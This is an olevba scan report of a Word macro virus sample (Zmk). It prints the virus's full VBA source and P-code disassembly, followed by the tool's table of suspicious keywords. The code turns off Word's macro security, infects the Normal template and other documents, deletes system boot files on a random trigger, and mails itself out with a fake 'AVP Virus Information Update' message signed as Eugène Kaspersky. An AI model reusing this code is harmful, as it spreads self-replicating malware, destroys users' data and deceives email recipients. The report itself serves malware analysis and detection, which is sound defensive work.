olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Zmk.r
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ZmkMail.cls 
in file: Virus.MSWord.Zmk.r - OLE stream: 'Macros/VBA/ZmkMail'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error GoTo ErrorDocOpen
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End If
Dim MyTime, COL, COLTemp, NumRnd
MyTime = Time
NumRnd = Int(Rnd * 13) + 1
THeur$ = Mid(MyTime, 1, 2)
TMin$ = Mid(MyTime, 4, 5)
TSec$ = Mid(MyTime, 7, 8)
iMacroNormalTempCount = NormalTemplate.VBProject.VBComponents.Count
For i = 1 To iMacroNormalTempCount
    If NormalTemplate.VBProject.VBComponents(i).Name = "ZmkMail" Then
        ZmkMailNormInstalled = -1
    End If
Next i
If Not ZmkMailNormInstalled Then
    ActiveDocument.VBProject.VBComponents("ZmkMail").Export "C:\Mail.sys"
    NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\mail.sys"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.DeleteLines 1, 4
    COLTemp = NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.CountOfLines
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 1, "Sub FileTemplates()"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 2, "    Application.EnableCancelKey = wdCancelDisabled"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 3, "End Sub"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 4, "Sub ToolsMacro()"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 5, "    Application.EnableCancelKey = wdCancelDisabled"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 6, "End Sub"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 7, "Sub ViewVBCode()"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 8, "    Application.EnableCancelKey = wdCancelDisabled"
    NormalTemplate.VBProject.VBComponents("ZmkMail").CodeModule.InsertLines COLTemp + 9, "End Sub"
Else
    iMacroDocuCount = ActiveDocument.VBProject.VBComponents.Count
    For i = 1 To iMacroDocuCount
        If ActiveDocument.VBProject.VBComponents(i).Name = "ZmkMail" Then
            ZmkMailDocInstalled = -1
        End If
    Next i
If Not ZmkMailDocInstalled Then
    NormalTemplate.VBProject.VBComponents("ZmkMail").Export "C:\Mail.sys"
    ActiveDocument.VBProject.VBComponents("ThisDocument").CodeModule.AddFromFile "C:\Mail.sys"
    ActiveDocument.VBProject.VBComponents("ZmkMail").CodeModule.DeleteLines 1, 4
    COL = ActiveDocument.VBProject.VBComponents("ZmkMail").CodeModule.CountOfLines
    ActiveDocument.VBProject.VBComponents("ZmkMail").CodeModule.DeleteLines COL - 8, 9
    ActiveDocument.Save
End If
If (THeur$ = "12") Or (TMin$ = "12") Or (TSec$ = "12") Then
    Call PayMail
Else
    Selection.EndKey Unit:=wdStory
    Selection.TypeParagraph
    Selection.TypeText "1*1=1 2*2=4 3*3=9"
    If (NumRnd = 13) And (TMin$ = "13") Then
        MsgBox "Clear Files", , "Microsoft Word"
        Kill "C:\Autoexec.bat"
        Kill "C:\Config.sys"
        Kill "C:\msdos.sys"
        Kill "c:\io.sys"
    End If
End If
End If
ErrorDocOpen:
End Sub
Private Sub PayMail()
On Error GoTo ErrorPayMail
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
End If
ms = Application.MailSystem
If ms = wdMAPI Then
    Options.SendMailAttach = True
    ActiveDocument.SendMail
    Dim PauseTime, Start, Finish, TotalTime
    PauseTime = 5
    Start = Timer
    Do While Timer < Start + PauseTime
    Loop
    SendKeys "%{o}", True
    SendKeys "h", True
    SendKeys "{TAB 3}", True
    SendKeys "{ENTER 2}", True
    SendKeys "{TAB 2}", True
    SendKeys "+{END}", True
    SendKeys "{DEL}", True
    SendKeys "AVP Virus Information Update", True
    SendKeys "{TAB 2}", True
    SendKeys "This mail contains important information about new macro virus.", True
    SendKeys "{ENTER}", True
    SendKeys "Please read the attached document, now"
    SendKeys "{ENTER 2}", True
    SendKeys "Send you suggestions or questions, to webmaster@avp.com", True
    SendKeys "{ENTER 2}", True
    SendKeys "Eugène Kaspersky", True
    SendKeys "%{s}", True
End If
ErrorPayMail:
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Zmk.r
' ===============================================================================
' Module streams:
' Macros/VBA/ZmkMail - 11641 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError ErrorDocOpen 
' Line #2:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #3:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #4:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #5:
' 	ElseBlock 
' Line #6:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #7:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	EndIfBlock 
' Line #11:
' 	Dim 
' 	VarDefn MyTime
' 	VarDefn COL
' 	VarDefn COLTemp
' 	VarDefn NumRnd
' Line #12:
' 	Ld Time 
' 	St MyTime 
' Line #13:
' 	Ld Rnd 
' 	LitDI2 0x000D 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St NumRnd 
' Line #14:
' 	Ld MyTime 
' 	LitDI2 0x0001 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	St THeur$ 
' Line #15:
' 	Ld MyTime 
' 	LitDI2 0x0004 
' 	LitDI2 0x0005 
' 	ArgsLd Mid$ 0x0003 
' 	St TMin$ 
' Line #16:
' 	Ld MyTime 
' 	LitDI2 0x0007 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	St TSec$ 
' Line #17:
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St iMacroNormalTempCount 
' Line #18:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroNormalTempCount 
' 	For 
' Line #19:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "ZmkMail"
' 	Eq 
' 	IfBlock 
' Line #20:
' 	LitDI2 0x0001 
' 	UMi 
' 	St ZmkMailNormInstalled 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #23:
' 	Ld ZmkMailNormInstalled 
' 	Not 
' 	IfBlock 
' Line #24:
' 	LitStr 0x000B "C:\Mail.sys"
' 	LitStr 0x0007 "ZmkMail"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #25:
' 	LitStr 0x000B "C:\mail.sys"
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #26:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	LitStr 0x0007 "ZmkMail"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #27:
' 	LitStr 0x0007 "ZmkMail"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St COLTemp 
' Line #28:
' 	Ld COLTemp 
' 	LitDI2 0x0001 
' 	Add 
' 	LitStr 0x0013 "Sub FileTemplates()"
' 	LitStr 0x0007 "ZmkMail"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #29:
' 	Ld COLTemp 
' 	LitDI2 0x0002 
' 	Add 
' 	LitStr 0x0032 "    Application.EnableCancelKey = wdCancelDisabled"
' 	LitStr 0x0007 "ZmkMail"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #30:
' 	Ld COLTemp 
' 	LitDI2 0x0003 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	LitStr 0x0007 "ZmkMail"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #31:
' 	Ld COLTemp 
' 	LitDI2 0x0004 
' 	Add 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	LitStr 0x0007 "ZmkMail"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #32:
' 	Ld COLTemp 
' 	LitDI2 0x0005 
' 	Add 
' 	LitStr 0x0032 "    Application.EnableCancelKey = wdCancelDisabled"
' 	LitStr 0x0007 "ZmkMail"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #33:
' 	Ld COLTemp 
' 	LitDI2 0x0006 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	LitStr 0x0007 "ZmkMail"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #34:
' 	Ld COLTemp 
' 	LitDI2 0x0007 
' 	Add 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	LitStr 0x0007 "ZmkMail"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #35:
' 	Ld COLTemp 
' 	LitDI2 0x0008 
' 	Add 
' 	LitStr 0x0032 "    Application.EnableCancelKey = wdCancelDisabled"
' 	LitStr 0x0007 "ZmkMail"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #36:
' 	Ld COLTemp 
' 	LitDI2 0x0009 
' 	Add 
' 	LitStr 0x0007 "End Sub"
' 	LitStr 0x0007 "ZmkMail"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #37:
' 	ElseBlock 
' Line #38:
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	St iMacroDocuCount 
' Line #39:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroDocuCount 
' 	For 
' Line #40:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "ZmkMail"
' 	Eq 
' 	IfBlock 
' Line #41:
' 	LitDI2 0x0001 
' 	UMi 
' 	St ZmkMailDocInstalled 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #44:
' 	Ld ZmkMailDocInstalled 
' 	Not 
' 	IfBlock 
' Line #45:
' 	LitStr 0x000B "C:\Mail.sys"
' 	LitStr 0x0007 "ZmkMail"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #46:
' 	LitStr 0x000B "C:\Mail.sys"
' 	LitStr 0x000C "ThisDocument"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromFile 0x0001 
' Line #47:
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	LitStr 0x0007 "ZmkMail"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #48:
' 	LitStr 0x0007 "ZmkMail"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St COL 
' Line #49:
' 	Ld COL 
' 	LitDI2 0x0008 
' 	Sub 
' 	LitDI2 0x0009 
' 	LitStr 0x0007 "ZmkMail"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #50:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Ld THeur$ 
' 	LitStr 0x0002 "12"
' 	Eq 
' 	Paren 
' 	Ld TMin$ 
' 	LitStr 0x0002 "12"
' 	Eq 
' 	Paren 
' 	Or 
' 	Ld TSec$ 
' 	LitStr 0x0002 "12"
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #53:
' 	ArgsCall (Call) PayMail 0x0000 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	Ld wdStory 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #56:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #57:
' 	LitStr 0x0011 "1*1=1 2*2=4 3*3=9"
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #58:
' 	Ld NumRnd 
' 	LitDI2 0x000D 
' 	Eq 
' 	Paren 
' 	Ld TMin$ 
' 	LitStr 0x0002 "13"
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #59:
' 	LitStr 0x000B "Clear Files"
' 	ParamOmitted 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #60:
' 	LitStr 0x000F "C:\Autoexec.bat"
' 	ArgsCall Kill 0x0001 
' Line #61:
' 	LitStr 0x000D "C:\Config.sys"
' 	ArgsCall Kill 0x0001 
' Line #62:
' 	LitStr 0x000C "C:\msdos.sys"
' 	ArgsCall Kill 0x0001 
' Line #63:
' 	LitStr 0x0009 "c:\io.sys"
' 	ArgsCall Kill 0x0001 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	EndIfBlock 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	Label ErrorDocOpen 
' Line #68:
' 	EndSub 
' Line #69:
' 	FuncDefn (Private Sub PayMail())
' Line #70:
' 	OnError ErrorPayMail 
' Line #71:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #72:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #73:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #74:
' 	ElseBlock 
' Line #75:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #76:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #77:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #78:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #79:
' 	EndIfBlock 
' Line #80:
' 	Ld Application 
' 	MemLd MailSystem 
' 	St ms 
' Line #81:
' 	Ld ms 
' 	Ld wdMAPI 
' 	Eq 
' 	IfBlock 
' Line #82:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SendMailAttach 
' Line #83:
' 	Ld ActiveDocument 
' 	ArgsMemCall SendMail 0x0000 
' Line #84:
' 	Dim 
' 	VarDefn PauseTime
' 	VarDefn Start
' 	VarDefn Finish
' 	VarDefn TotalTime
' Line #85:
' 	LitDI2 0x0005 
' 	St PauseTime 
' Line #86:
' 	Ld Timer 
' 	St Start 
' Line #87:
' 	Ld Timer 
' 	Ld Start 
' 	Ld PauseTime 
' 	Add 
' 	Lt 
' 	DoWhile 
' Line #88:
' 	Loop 
' Line #89:
' 	LitStr 0x0004 "%{o}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #90:
' 	LitStr 0x0001 "h"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #91:
' 	LitStr 0x0007 "{TAB 3}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #92:
' 	LitStr 0x0009 "{ENTER 2}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #93:
' 	LitStr 0x0007 "{TAB 2}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #94:
' 	LitStr 0x0006 "+{END}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #95:
' 	LitStr 0x0005 "{DEL}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #96:
' 	LitStr 0x001C "AVP Virus Information Update"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #97:
' 	LitStr 0x0007 "{TAB 2}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #98:
' 	LitStr 0x003F "This mail contains important information about new macro virus."
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #99:
' 	LitStr 0x0007 "{ENTER}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #100:
' 	LitStr 0x0026 "Please read the attached document, now"
' 	ArgsCall SendKeys 0x0001 
' Line #101:
' 	LitStr 0x0009 "{ENTER 2}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #102:
' 	LitStr 0x0037 "Send you suggestions or questions, to webmaster@avp.com"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #103:
' 	LitStr 0x0009 "{ENTER 2}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #104:
' 	LitStr 0x0010 "Eugène Kaspersky"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #105:
' 	LitStr 0x0004 "%{s}"
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #106:
' 	EndIfBlock 
' Line #107:
' 	Label ErrorPayMail 
' Line #108:
' 	EndSub 
' Line #109:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |Autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

